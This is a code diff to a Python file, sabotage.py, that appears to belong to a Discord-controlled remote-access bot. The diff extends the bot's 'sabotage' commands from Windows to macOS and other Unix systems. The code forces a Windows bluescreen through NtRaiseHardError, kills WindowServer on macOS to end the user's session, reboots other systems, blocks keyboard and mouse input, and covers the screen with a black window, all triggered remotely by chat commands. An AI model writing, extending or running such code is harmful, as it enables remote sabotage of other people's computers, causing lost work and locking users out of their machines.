@@ -1,8 +1,9 @@
 """
-commands/sabotage.py - BSOD, input blocking, and blackscreen commands.
+commands/sabotage.py - BSOD, input blocking, and blackscreen commands with macOS support.
 """
 
-import ctypes
+import os
+import platform
 import threading
 import tkinter as tk
 
@@ -36,6 +37,7 @@ def _block_input():
     global _input_blocked, _keyboard_listener, _mouse_listener
     if not _input_blocked:
         _input_blocked = True
+        # Note: On macOS, this requires Accessibility permissions for the terminal/app
         _keyboard_listener = keyboard.Listener(suppress=True)
         _mouse_listener = mouse.Listener(suppress=True)
         _keyboard_listener.start()
@@ -47,8 +49,10 @@ def _unblock_input():
     global _input_blocked, _keyboard_listener, _mouse_listener
     if _input_blocked:
         _input_blocked = False
-        _keyboard_listener.stop()
-        _mouse_listener.stop()
+        if _keyboard_listener:
+            _keyboard_listener.stop()
+        if _mouse_listener:
+            _mouse_listener.stop()
         print("Input unblocked.")
 
 
@@ -78,16 +82,18 @@ class SabotageCommands(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    # ── BSOD ───────────────────────────────────────────────────────────────
+    # ── BSOD / Kernel Panic ───────────────────────────────────────────────
     @commands.command(name="bsod")
     @commands.check(is_authorized)
     async def bsod(self, ctx):
         if not in_correct_channel(ctx):
             await wrong_channel(ctx)
             return
+        
+        system_type = "Bluescreen" if IS_WINDOWS else "Kernel Panic / Session Crash"
         _confirmation_pending[ctx.author.id] = True
         await ctx.send(
-            "⚠️ Warning: You are about to trigger a Bluescreen! Type `!confirm_bsod` within 15 seconds to confirm."
+            f"⚠️ Warning: You are about to trigger a {system_type}! Type `!confirm_bsod` within 15 seconds to confirm."
         )
         import asyncio
 
@@ -102,20 +108,26 @@ class SabotageCommands(commands.Cog):
     @commands.check(is_authorized)
     async def confirm_bsod(self, ctx):
         if _confirmation_pending.get(ctx.author.id):
-            if not IS_WINDOWS:
-                await ctx.send("❌ BSOD is only supported on Windows.")
-                _confirmation_pending.pop(ctx.author.id, None)
-                return
-            await ctx.send("Triggering Bluescreen now... 💀")
-            ctypes.windll.ntdll.RtlAdjustPrivilege(
-                19, 1, 0, ctypes.byref(ctypes.c_bool())
-            )
-            ctypes.windll.ntdll.NtRaiseHardError(
-                0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
-            )
+            await ctx.send("Triggering system crash... 💀")
+            
+            if platform.system() == "Windows":
+                import ctypes
+                ctypes.windll.ntdll.RtlAdjustPrivilege(
+                    19, 1, 0, ctypes.byref(ctypes.c_bool())
+                )
+                ctypes.windll.ntdll.NtRaiseHardError(
+                    0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
+                )
+            elif platform.system() == "Darwin":
+                # macOS sabotage: Forcefully kill the WindowServer to crash the GUI session
+                # This effectively logs the user out and closes all applications instantly.
+                os.system("killall WindowServer")
+            else:
+                # Fallback for other Unix systems
+                os.system("reboot")
         else:
             await ctx.send(
-                "No pending Bluescreen confirmation. Use `!bsod` to start the process."
+                "No pending confirmation. Use `!bsod` to start the process."
             )
         _confirmation_pending.pop(ctx.author.id, None)
 
@@ -134,6 +146,8 @@ class SabotageCommands(commands.Cog):
         if not in_correct_channel(ctx):
             await wrong_channel(ctx)
             return
+        
+        action = action.lower()
         if action == "block":
             if _input_blocked:
                 msg = await ctx.send("❌ Input is already blocked.")
@@ -171,6 +185,7 @@ class SabotageCommands(commands.Cog):
                 duration=10,
             )
             return
+        
         if action is None:
             await send_temporary_message(
                 ctx,
@@ -179,7 +194,8 @@ class SabotageCommands(commands.Cog):
             )
             return
 
-        if action.lower() == "on":
+        action = action.lower()
+        if action == "on":
             if _black_window is not None:
                 await send_temporary_message(
                     ctx, "❌ **Error:** The black screen is already on.", duration=10
@@ -189,14 +205,14 @@ class SabotageCommands(commands.Cog):
                 threading.Thread(target=_blackscreen_on, daemon=True).start()
                 await turning_on.delete()
                 await ctx.send("✅ **Black screen is now on.**")
-        elif action.lower() == "off":
+        elif action == "off":
             if _black_window is None:
                 await send_temporary_message(
                     ctx, "❌ **Error:** The black screen is not on.", duration=10
                 )
             else:
                 turning_off = await ctx.send("🖥️ **Turning off the black screen...**")
-                threading.Thread(target=_blackscreen_off, daemon=True).start()
+                _blackscreen_off()
                 await turning_off.delete()
                 await ctx.send("✅ **Black screen is now off.**")
         else:
